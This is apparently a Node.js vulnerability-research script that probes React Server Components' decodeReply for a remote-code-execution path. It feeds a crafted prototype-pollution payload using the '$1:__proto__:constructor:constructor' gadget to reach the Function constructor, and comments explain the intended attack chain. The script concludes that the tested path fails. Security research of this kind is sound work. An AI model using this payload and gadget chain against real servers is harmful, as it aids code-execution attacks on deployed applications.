/**
 * Test: Can we create a pre-fulfilled chunk with controlled value?
 *
 * If chunk.status === "fulfilled" and chunk.value === "our code"
 * Then chunk.then(Function) would call Function("our code") = RCE!
 *
 * Looking at Chunk.prototype.then:
 *   case "fulfilled":
 *     resolve(this.value);  // <-- If resolve=Function, value="code", RCE!
 *
 * The question: Can we craft a payload where:
 * 1. A chunk resolves to our code string
 * 2. Something calls .then(Function) on that chunk
 */

'use strict';

const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => ({});

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: Pre-fulfilled chunk RCE path');
console.log('='.repeat(60));
console.log('');

async function test() {
  console.log('[1] The attack path:');
  console.log('    Chunk.prototype.then:');
  console.log('      case "fulfilled":');
  console.log('        resolve(this.value);');
  console.log('');
  console.log('    If we could make:');
  console.log('      resolve = Function');
  console.log('      this.value = "return 42"');
  console.log('    Then: Function("return 42") -> new function!');
  console.log('');

  console.log('[2] How chunks are used:');
  console.log('    - Chunks are internal to the Flight protocol');
  console.log('    - .then() is called with createModelResolver callbacks');
  console.log('    - We cannot directly call chunk.then(Function)');
  console.log('');

  console.log('[3] But what if we could make a property ACCESS call .then()?');
  console.log('');

  // In JavaScript, we can't make property access call .then()
  // UNLESS... we use a Proxy with a "get" trap that calls .then()
  // But we can't create Proxies via JSON

  // What about prototype pollution?
  // If we pollute Object.prototype.then = something...

  console.log('[4] Testing: Can proto traversal affect .then behavior?');
  console.log('');

  // We can get Function via $1:__proto__:constructor:constructor
  // Can we also SET properties via the traversal?

  // The traversal in createModelResolver does:
  //   for (var i = 1; i < path.length; i++) value = value[path[i]];
  //
  // This only READS, doesn't write.

  // What about the reviveModel function?
  // It does: value[i] = parentObj
  // Can we make it write to __proto__?

  console.log('[5] Checking if reviveModel can pollute prototype:');

  // Try creating an object where we set __proto__.then
  const formData = new Map();
  formData.set('0', '{"__proto__": {"then": "$1:__proto__:constructor:constructor"}}');
  formData.set('1', '{"x":1}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('    Result:', result);
    console.log('    Result.__proto__:', result.__proto__);
    console.log('    Result.__proto__.then:', result.__proto__.then);

    // Check if Object.prototype was polluted
    console.log('    ({}).then:', ({}).then);
    console.log('    Object.prototype.then:', Object.prototype.then);
  } catch (e) {
    console.log('    Error:', e.message);
  }

  console.log('');
  console.log('[6] Alternative: What if we can make something ELSE call .then()?');
  console.log('');

  // The noop$1 function is interesting:
  //   thenable.then(noop$1, noop$1)
  //
  // noop$1 is defined as: function noop$1() {}
  // This won't help us

  // What about when things await?
  // await always passes resolve/reject functions

  console.log('    All .then() calls in the library pass functions as arguments.');
  console.log('    We cannot control what .then() receives.');
  console.log('');
}

test().catch(console.error);
